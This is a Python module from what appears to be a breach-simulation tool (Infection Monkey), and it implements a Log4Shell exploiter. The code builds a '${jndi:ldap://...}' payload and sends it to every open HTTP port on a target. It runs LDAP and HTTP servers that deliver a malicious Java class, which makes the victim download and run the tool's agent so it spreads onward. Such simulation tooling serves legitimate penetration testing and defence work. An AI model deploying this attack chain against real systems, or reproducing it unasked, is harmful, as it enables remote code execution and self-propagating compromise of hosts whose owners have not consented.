import logging
from threading import Thread
from time import sleep

from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.log4shell_utils import (
    LINUX_EXPLOIT_TEMPLATE_PATH,
    WINDOWS_EXPLOIT_TEMPLATE_PATH,
    ExploitClassHTTPServer,
    LDAPExploitServer,
    build_exploit_bytecode,
    get_log4shell_service_exploiters,
)
from infection_monkey.exploit.tools.helpers import get_monkey_depth
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.web_rce import WebRCE
from infection_monkey.model import (
    LOG4SHELL_LINUX_COMMAND,
    LOG4SHELL_WINDOWS_COMMAND,
    MONKEY_ARG,
    VictimHost,
)
from infection_monkey.network.info import get_free_tcp_port
from infection_monkey.network.tools import get_interface_to_target
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.monkey_dir import get_monkey_dir_path

logger = logging.getLogger(__name__)


class Log4ShellExploiter(WebRCE):
    _TARGET_OS_TYPE = ["linux", "windows"]
    EXPLOIT_TYPE = ExploitType.VULNERABILITY
    _EXPLOITED_SERVICE = "Log4j"
    DOWNLOAD_TIMEOUT = 15
    REQUEST_TO_VICTIM_TIME = 5  # How long the request from victim to monkey might take. In seconds

    def __init__(self, host: VictimHost):
        super().__init__(host)

        self.ldap_port = get_free_tcp_port()

        self.class_http_server_ip = get_interface_to_target(self.host.ip_addr)
        self.class_http_server_port = get_free_tcp_port()

        self.ldap_server = None
        self.ldap_server_thread = None
        self.exploit_class_http_server = None
        self.exploit_class_http_server_thread = None
        self.agent_http_server_thread = None

    def _exploit_host(self):
        self.start_servers()
        try:
            return self.exploit(None, None)
        finally:
            self.stop_servers()

    def start_servers(self):
        # Start http server, to serve agent to victims
        paths = self.get_monkey_paths()
        agent_http_path = self.start_agent_http_server(paths)

        # Build agent execution command
        command = self.build_command(paths["dest_path"], agent_http_path)

        # Start http server to serve malicious java class to victim
        self.start_class_http_server(command)

        # Start ldap server to redirect ldap query to java class server
        self.start_ldap_server()

    def start_agent_http_server(self, agent_paths: dict) -> str:
        # Create server for http download and wait for it's startup.
        http_path, http_thread = HTTPTools.create_locked_transfer(
            self.host, agent_paths["src_path"]
        )
        self.agent_http_server_thread = http_thread
        if not http_path:
            logger.debug("Exploiter failed, couldn't start an http server to serve agent.")
            raise Exception("Http server creation failed")
        logger.info("Started http server on %s", http_path)
        return http_path

    def start_class_http_server(self, command: str):
        java_class = self.build_java_class(command)

        self.exploit_class_http_server = ExploitClassHTTPServer(
            self.class_http_server_ip, self.class_http_server_port, java_class
        )
        # Setting `daemon=True` to save ourselves some trouble when this is merged to the
        # agent-refactor branch.
        # TODO: Make a call to `create_daemon_thread()` instead of calling the `Thread()`
        # constructor directly after merging to the agent-refactor branch.
        self.exploit_class_http_server_thread = Thread(
            target=self.exploit_class_http_server.run, daemon=True
        )
        self.exploit_class_http_server_thread.start()

    def start_ldap_server(self):
        self.ldap_server = LDAPExploitServer(
            ldap_server_port=self.ldap_port,
            http_server_ip=self.class_http_server_ip,
            http_server_port=self.class_http_server_port,
            storage_dir=get_monkey_dir_path(),
        )

        # Setting `daemon=True` to save ourselves some trouble when this is merged to the
        # agent-refactor branch.
        # TODO: Make a call to `create_daemon_thread()` instead of calling the `Thread()`
        # constructor directly after merging to the agent-refactor branch.
        self.ldap_server_thread = Thread(target=self.ldap_server.run, daemon=True)
        self.ldap_server_thread.start()

    def stop_servers(self):
        logger.debug("Stopping all LDAP and HTTP Servers")
        self.agent_http_server_thread.stop()
        self.agent_http_server_thread.join(Log4ShellExploiter.DOWNLOAD_TIMEOUT)

        self.exploit_class_http_server.stop()
        self.exploit_class_http_server_thread.join(Log4ShellExploiter.DOWNLOAD_TIMEOUT)

        self.ldap_server.stop()
        self.ldap_server_thread.join(Log4ShellExploiter.DOWNLOAD_TIMEOUT)

    def build_ldap_payload(self):
        interface_ip = get_interface_to_target(self.host.ip_addr)
        return f"${{jndi:ldap://{interface_ip}:{self.ldap_port}/dn=Exploit}}"

    # TODO remove duplication with infection_monkey.exploit.hadoop.HadoopExploiter.build_command
    def build_command(self, path, http_path):
        # Build command to execute
        monkey_cmd = build_monkey_commandline(
            self.host, get_monkey_depth() - 1, vulnerable_port=None
        )
        if "linux" in self.host.os["type"]:
            base_command = LOG4SHELL_LINUX_COMMAND
        else:
            base_command = LOG4SHELL_WINDOWS_COMMAND

        return base_command % {
            "monkey_path": path,
            "http_path": http_path,
            "monkey_type": MONKEY_ARG,
            "parameters": monkey_cmd,
        }

    def build_java_class(self, exploit_command: str) -> bytes:
        if "linux" in self.host.os["type"]:
            return build_exploit_bytecode(exploit_command, LINUX_EXPLOIT_TEMPLATE_PATH)
        else:
            return build_exploit_bytecode(exploit_command, WINDOWS_EXPLOIT_TEMPLATE_PATH)

    def exploit(self, url, command) -> bool:
        # Try to exploit all services,
        # because we don't know which services are running and on which ports
        open_ports = [
            int(port[0]) for port in WebRCE.get_open_service_ports(self.host, self.HTTP, ["http"])
        ]
        for exploit in get_log4shell_service_exploiters():
            for port in open_ports:
                exploit.trigger_exploit(self.build_ldap_payload(), self.host, port)

                # Wait for request
                sleep(Log4ShellExploiter.REQUEST_TO_VICTIM_TIME)

                if self.exploit_class_http_server.exploit_class_downloaded():
                    self.exploit_info["vulnerable_service"] = {
                        "service_name": exploit.service_name,
                        "port": port,
                    }
                    return True
        return False
